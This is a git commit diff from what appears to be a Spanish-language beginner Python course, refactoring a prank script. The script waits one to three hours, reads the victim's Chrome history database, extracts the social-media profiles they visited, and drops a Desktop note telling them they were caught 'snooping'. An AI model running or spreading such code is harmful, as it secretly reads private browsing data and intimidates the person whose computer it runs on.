234d597ac1cbfa4804eaa38c633bcc78afe19b20
Vicente Mendez <vicente@vmhq.cl>
2023-11-03 00:27:44 -0300

    update code

--- Curso de introducción Python [Mastermind]/Módulo 3/profile_search_forwindows.py
+++ Curso de introducción Python [Mastermind]/Módulo 3/profile_search_forwindows.py
@@ -4,29 +4,29 @@ from time import sleep
 from random import randrange
 import re
 
-HACKER_FILE_NAME = "Leeme.txt"
+HACKER_FILE_NAME = "leeme.txt"
 
 
 def get_user_path():
-    return "{}/".format(Path.home())
+    return f"{Path.home()}/"
 
 
 def delay_action():
     number_of_hours = randrange(1, 4)
-    print("Dormire {} horas.".format(number_of_hours))
+    print(f"Dormiré {number_of_hours} horas.")
     sleep(number_of_hours * 60 * 60)
 
 
-def create_hacker_file(user_path):
-    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
-    return hacker_file
+def create_hacker_file(user_path, profiles_visited):
+    with open(user_path + "Desktop/" + HACKER_FILE_NAME, "w") as hacker_file:
+        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
 
 
 def get_chrome_history(user_path):
     urls = None
     while not urls:
         try:
-            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
+            history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
             connection = sqlite3.connect(history_path)
             cursor = connection.cursor()
             cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
@@ -38,26 +38,22 @@ def get_chrome_history(user_path):
             sleep(3)
 
 
-def check_visited_profiles_and_scare_user(hacker_file, chrome_history):
+def check_visited_profiles(chrome_history):
     profiles_visited = []
     for item in chrome_history:
-        results_of_twitter = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
-        results_of_youtube = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
-        results_of_facebook = re.findall("https://www.facebook.com/([A-Za-z0-9]+)$", item[2])
+        results_of_twitter = re.findall("https://twitter.com/([A-Za-z0-9_]+)$", item[2])
+        results_of_youtube = re.findall("https://www.youtube.com/@([A-Za-z0-9_]+)$", item[2])
+        results_of_facebook = re.findall("https://www.facebook.com/([A-Za-z0-9_.]+)$", item[2])
 
         results = []
-        for result in results_of_twitter:
-            results.append(result)
-        for result in results_of_youtube:
-            results.append(result)
-        for result in results_of_facebook:
-            results.append(result)
+        results.extend(results_of_twitter)
+        results.extend(results_of_youtube)
+        results.extend(results_of_facebook)
 
-        if results and results[0] not in ["notificacions", "home"] and results[0] not in profiles_visited:
-            profiles_visited.append(results[0])
-
-
-    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
+        for result in results:
+            if result and result not in ["notifications", "home"] and result not in profiles_visited:
+                profiles_visited.append(result)
+    return profiles_visited
 
 
 def main():
@@ -70,11 +66,13 @@ def main():
     # Recogemos su historial de Google Chrome (cuando sea posible)
     chrome_history = get_chrome_history(user_path)
 
-    # Creamos un archivo en el escritorio
-    hacker_file = create_hacker_file(user_path)
-
-    # Escribiendo mensajes de miedo
-    check_visited_profiles_and_scare_user(hacker_file, chrome_history)
+    # Revisamos si ha visitado perfiles
+    profiles_visited = check_visited_profiles(chrome_history)
+    if profiles_visited:
+        # Si hay perfiles visitados, creamos un archivo en el escritorio
+        create_hacker_file(user_path, profiles_visited)
+    else:
+        print("No se encontraron perfiles de redes sociales visitados recientemente.")
 
 
 if __name__ == "__main__":
